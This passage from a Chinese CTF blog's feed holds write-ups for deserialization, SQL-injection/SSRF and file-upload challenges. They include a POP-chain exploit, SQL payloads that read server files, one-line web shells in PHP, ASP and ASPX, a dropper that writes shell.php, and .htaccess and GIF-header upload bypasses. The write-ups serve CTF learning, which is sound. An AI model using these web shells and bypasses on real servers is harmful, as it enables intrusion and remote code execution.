variable&#34;&gt;$str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;__construct&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$file&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token variable&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&gt;&lt;/span&gt;&lt;span class=&#34;token property&#34;&gt;source&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$file&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;   &lt;span class=&#34;token comment&#34;&gt;// 为了让 file 成一个对象，而不是一个数据，要调用两次&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;Test&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$p&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;// 没法直接让 p 等于一个新的对象，需要通过方法来赋值&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;__construct&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token variable&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&gt;&lt;/span&gt;&lt;span class=&#34;token property&#34;&gt;p&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;Modifier&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$a&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;Show&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;fanqie&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;// 随便赋值，为了让 file 有值，否则会报错警告&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$a&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&gt;&lt;/span&gt; str &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;Test&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;   &lt;span class=&#34;token comment&#34;&gt;// 让 str 等于一个类&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$b&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;Show&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$a&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;        &lt;span class=&#34;token comment&#34;&gt;// 再次调用，让 file 赋值成一个对象，触发__tostring ()，开始 pop 链&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;urlencode&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;serialize&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$b&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;// 输出编码后的序列化字符串，带入 payload 就行&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;将得到的值通过 get 传入，得到 base64 码，解码得到 flag&lt;/p&gt;
</content>
        <category term="反序列化" />
        <updated>2021-08-10T15:44:31.014Z</updated>
    </entry>
    <entry>
        <id>http://imfanqie.top/2021/08/04/ctf/web/ssrf/(ctfwp)ssrf%E5%AD%A6%E4%B9%A0/</id>
        <title>(ctfwp)ssrf学习</title>
        <link rel="alternate" href="http://imfanqie.top/2021/08/04/ctf/web/ssrf/(ctfwp)ssrf%E5%AD%A6%E4%B9%A0/"/>
        <content type="html">&lt;p&gt;学习一下 ssrf&lt;/p&gt;
&lt;p&gt;&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h1 id=&#34;1网鼎杯-2018fakebook&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1网鼎杯-2018fakebook&#34;&gt;#&lt;/a&gt; 1.[网鼎杯 2018] Fakebook&lt;/h1&gt;
&lt;hr&gt;
&lt;p&gt;这题本来没做出来，搜了下 wp，学会了几种方法，并且大致认识了 ssrf。&lt;/p&gt;
&lt;p&gt;下面记录一下：&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;进去找了找，发现有 sql 注入漏洞，并且能通过联合查询查到库名表明列名，但是最后显示序列化过的，也没有发现和 flag 相关的东西，遂没有思路了：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/08/04/RSGoX4ajlEJsZ6C.png&#34; alt&gt;&amp;lt;!--p1--&amp;gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/08/04/NVZu47xFBnMLGHb.png&#34; alt&gt;&amp;lt;!--p2--&amp;gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/08/04/hM59EpYwiUaIyqo.png&#34; alt&gt;&amp;lt;!--p3--&amp;gt;&lt;/p&gt;
&lt;p&gt;看了 wp 后，发现了这个网站还有 robots.txt 文件，我压根没考虑那么多。。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/08/04/LhAlONzk6CesMrK.png&#34; alt&gt;&amp;lt;!--p4--&amp;gt;&lt;/p&gt;
&lt;p&gt;根据大概意思可以猜测出，应该是 get 了一组信息在 blog 的位置，所以可以把需要 get 的信息写到 blog 位置，应该能出 flag，另外还要注意得用序列化的形式写&lt;/p&gt;
&lt;p&gt;把 txt 中前面的信息复制下来，根据题目中爆出来的文件路径，本地构造序列化内容，用 file 协议读：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/08/04/6G5hnEuYfxBk7HI.png&#34; alt&gt;&amp;lt;!--P5--&amp;gt;&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;no&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;/*!union*/&lt;/span&gt; select &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;O:8:&#34;UserInfo&#34;:3:&amp;#123;s:4:&#34;name&#34;;s:1:&#34;1&#34;;s:3:&#34;age&#34;;i:10;s:4:&#34;blog&#34;;s:29:&#34;file:///var/www/html/flag.php&#34;;&amp;#125;&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;在源码中读取 flag：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/08/04/e6OznuxXFDya9oi.png&#34; alt&gt;&amp;lt;!--p6--&amp;gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;* 其他方法：&lt;/p&gt;
&lt;p&gt;通过 load_file 读取文件获取&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token string-interpolation&#34;&gt;&lt;span class=&#34;token string&#34;&gt;f&#34;if(ascii(substr((load_file(&#39;/var/www/html/flag.php&#39;)),&lt;/span&gt;&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;i&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;,1))&gt;&lt;/span&gt;&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;mid&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;,1,0)&#34;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;把 payload 带入盲注二分法程序中跑，能跑出来 flag，原理就是 load_file 能读取本地文件。&lt;/p&gt;
&lt;p&gt;还可以通过 load_file 注入一句话木马，用菜刀链接解：&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMzQyMTQxL2FydGljbGUvZGV0YWlscy8xMDMyNTMxMjQ=&#34;&gt;SQL 注入一句话木马（load_file/out file&lt;/span&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;遇到类似的再补充&lt;/p&gt;
&lt;p&gt;END&lt;/p&gt;
</content>
        <category term="SSRF" />
        <updated>2021-08-04T11:17:39.048Z</updated>
    </entry>
    <entry>
        <id>http://imfanqie.top/2021/08/02/ctf/web/upload/(ctfwp)upload%E7%B1%BB%E9%A2%98%E7%9B%AE%E5%8F%8A%E8%9A%81%E5%89%91%E7%9A%84%E8%BF%90%E7%94%A8/</id>
        <title>(ctfwp)upload类题目及蚁剑的运用</title>
        <link rel="alternate" href="http://imfanqie.top/2021/08/02/ctf/web/upload/(ctfwp)upload%E7%B1%BB%E9%A2%98%E7%9B%AE%E5%8F%8A%E8%9A%81%E5%89%91%E7%9A%84%E8%BF%90%E7%94%A8/"/>
        <content type="html">&lt;p&gt;无聊刷题的时候遇到了点麻烦，经过学习后，认识了下中国蚁剑这款 np 的工具。&lt;/p&gt;
&lt;p&gt;结果没想到又遇到了 upload 类的题目，正好又用到了。。&lt;/p&gt;
&lt;p&gt;晕了，那就写一下，以后方便复习吧。&lt;/p&gt;
&lt;p&gt;&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;先从最简单的写起：&lt;/p&gt;
&lt;h1 id=&#34;1极客大挑战-2019knife&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1极客大挑战-2019knife&#34;&gt;#&lt;/a&gt; 1.[极客大挑战 2019] Knife&lt;/h1&gt;
&lt;p&gt;进去后就一个界面，再无数尝试后学习了下别人的 wp：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/08/02/PX8r45KHinAgmkc.png&#34; alt&gt;&amp;lt;!--p1--&amp;gt;&lt;/p&gt;
&lt;p&gt;现在看来，确实提示的非常明显&lt;/p&gt;
&lt;p&gt;1. 题目为 knife，可以想到 &lt;strong&gt;中国菜刀&lt;/strong&gt; 这个软件，他是 &lt;strong&gt;中国蚁剑&lt;/strong&gt; 的前辈了。&lt;/p&gt;
&lt;p&gt;2. 中间有很明显得 一句话木马 的代码提示，可惜当时我还不知道。&lt;/p&gt;
&lt;p&gt;折腾半天后用 蚁剑 成功连接上网站，查看目录，flag 在根目录：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/08/02/RhW2LsGpA8wonKj.png&#34; alt&gt;&amp;lt;!--p2--&amp;gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;2actf2020-新生赛upload&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2actf2020-新生赛upload&#34;&gt;#&lt;/a&gt; 2.[ACTF2020 新生赛] Upload&lt;/h1&gt;
&lt;p&gt;这道题稍微多了一点点难度：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/08/02/jhQl4gMPxXOqER8.png&#34; alt&gt;&amp;lt;!--p3--&amp;gt;&lt;/p&gt;
&lt;p&gt;1. 加了上传文件这个功能，查资料后我了解到了这类题的解题方法。&lt;/p&gt;
&lt;p&gt;2. 只能上传图片，无法直接解析代码，不能直接上传 php 来执行，需要绕过。&lt;/p&gt;
&lt;p&gt;3. 要学习一下 一句话木马。&lt;/p&gt;
&lt;p&gt;所以这里先复习一常用的一句话木马（原理、介绍太多就不写了）&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;一句话木马&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#一句话木马&#34;&gt;#&lt;/a&gt; 一句话木马&lt;/h2&gt;
&lt;p&gt;最简单的一句话木马：&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;php的一句话是:    &lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt; @&lt;span class=&#34;token keyword&#34;&gt;eval&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_POST&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;flag&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token delimiter important&#34;&gt;?&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;pre&gt;&lt;code class=&#34;language-asp&#34;&gt;asp的一句话是：   &amp;lt;%eval request (&amp;quot;pass&amp;quot;)%&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;language-aspx&#34;&gt;aspx的一句话是：  &amp;lt;%@ Page Language=&amp;quot;Jscript&amp;quot;%&amp;gt; &amp;lt;%eval(Request.Item[&amp;quot;pass&amp;quot;],&amp;quot;unsafe&amp;quot;);%&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;language-php+HTML&#34;&gt;phtml的一句话是:  &amp;lt;script language=&amp;quot;php&amp;quot;&amp;gt;eval($_POST[&#39;flag&#39;]);&amp;lt;/script&amp;gt;
				&amp;lt;?php @eval($_POST[&#39;flag&#39;]);?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;第一个和第四个最常用，实测 [ ] 里面不用引号 ‘ ’ 也行。&lt;/p&gt;
&lt;p&gt;* 如果是图片还可以（我还没试成功过，但是有这个方法）:&lt;/p&gt;
&lt;p&gt;上传一个名字为 wooyun.jpg，内容为&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?PHP&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;fputs&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;fopen&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;shell.php&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;w&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;&amp;lt;?php eval($_POST[cmd])?&gt;&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token delimiter important&#34;&gt;?&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;的文件，然后访问 wooyun.jpg/.php, 在这个目录下就会生成一句话木马 shell.php&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;继续本题 &amp;gt;&amp;gt;&lt;/p&gt;
&lt;p&gt;思路：先假装传图片，然后改格式为 php 或者其他的几个&lt;/p&gt;
&lt;p&gt;在本地写一个 txt，用 php 的一句话，后缀改为 jpg 传入，同时用 burp 抓包：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/08/02/fZT8p3ynXIxrPjk.png&#34; alt&gt;&amp;lt;!--p4--&amp;gt;&lt;/p&gt;
&lt;p&gt;然后改后缀，文件格式保持不变，经过尝试，php 会报错，用 phtml 可以成功上传：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/08/02/tfIV6TNXzDwEAdP.png&#34; alt&gt;&amp;lt;!--p5--&amp;gt;&lt;/p&gt;
&lt;p&gt;根据 unload 的位置，链接蚁剑，登录，在根目录获取 flag：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/08/02/hxfW49uze17AlKw.png&#34; alt&gt;&amp;lt;!--p6--&amp;gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;3极客大挑战-2019upload&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#3极客大挑战-2019upload&#34;&gt;#&lt;/a&gt; 3.[极客大挑战 2019] Upload&lt;/h1&gt;
&lt;p&gt;本题也是，只能上传图片格式，思路同上题一样，传一个 一句话木马 。&lt;/p&gt;
&lt;p&gt;本地写好后，抓包，改后缀 phtml（php 被 ban 了），发现 &amp;lt;? 也被 ban 了：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/08/02/EeAgnSJcRmdzItF.png&#34; alt&gt;&amp;lt;!--p7--&amp;gt;&lt;/p&gt;
&lt;p&gt;试一下上面的第一个代码：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-php+HTML&#34;&gt;&amp;lt;script language=&amp;quot;php&amp;quot;&amp;gt;eval($_POST[&#39;flag&#39;]);&amp;lt;/script&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/08/02/cb7ruGeqo4Up1TB.png&#34; alt&gt;&amp;lt;!--p8--&amp;gt;&lt;/p&gt;
&lt;p&gt;发现还是能检测不是图片，在语句前加一个  &lt;code&gt;GIF86a&lt;/code&gt;  伪装一下：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/08/02/4yIuQPZhYH1VKzw.png&#34; alt&gt;&amp;lt;!--p9--&amp;gt;&lt;/p&gt;
&lt;p&gt;可以发现成功上传，因为没有具体回显地址，又根据网址后面的后缀，可以猜测应该是上传到 upload 中：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/08/02/jeQoCLwqA3vm5sn.png&#34; alt=&#34;10.png&#34;&gt;&amp;lt;!--p10--&amp;gt;&lt;/p&gt;
&lt;p&gt;果然，直接打开蚁剑：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/08/02/ZCVkziw1pmWdSHv.png&#34; alt&gt;&amp;lt;!--p11--&amp;gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/08/02/YjfUiJvI6ClmFen.png&#34; alt&gt;&amp;lt;!--p12--&amp;gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;4mrctf2020你传你呢&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#4mrctf2020你传你呢&#34;&gt;#&lt;/a&gt; 4.[MRCTF2020] 你传你🐎呢&lt;/h1&gt;
&lt;p&gt;这题前面的流程，思路和 2 一样，先伪造上传，然后改后缀&lt;/p&gt;
&lt;p&gt;但是再多次尝试后发现改后缀依旧被 ban，采用 3 的方法还是被 ban, 只能上传图片：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/08/02/J46ICkHtUyBXqPw.png&#34; alt&gt;&amp;lt;!--p13--&amp;gt;&lt;/p&gt;
&lt;p&gt;再查阅资料后，发现是需要更改 htaccess 配置，将其他类型文件转为 php 文件&lt;/p&gt;
&lt;h2 id=&#34;htaccess&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#htaccess&#34;&gt;#&lt;/a&gt; &lt;strong&gt;htaccess&lt;/strong&gt;&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-txt&#34;&gt;.htaccess可以帮我们实现包括：文件夹密码保护、用户自动重定向、自定义错误页面、改变你的文件扩展名、封禁特定IP地址的用户、只允许特定IP地址的用户、禁止目录列表，以及使用其他文件作为index文件等一些功能
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;将下面的内容写入 .htaccess（注意没有名字，直接.htaccess!!!）&lt;/p&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;FilesMatch &lt;span class=&#34;token string&#34;&gt;&#34;flag.jpg&#34;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;SetHandler application/x-httpd-php&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;/FilesMatch&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;第一行要保证与需修改的文件同名&lt;/p&gt;
&lt;p&gt;（这个也行，这个意思是将 jpg 全当成 php）（注意没有名字，直接.htaccess!!!）&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;AddType application/x-httpd-php .jpg
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;随便选一个上传&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/08/02/yU3cgb6zSndHTBR.png&#34; alt&gt;&amp;lt;!--p14--&amp;gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/08/02/fzT9AlVMRLZtPjv.png&#34; alt&gt;&amp;lt;!--p15--&amp;gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;END&lt;/p&gt;
</content>
        <category term="upload" />
        <updated>2021-08-02T13:26:51.812Z</updated>
    </entry>
    <entry>
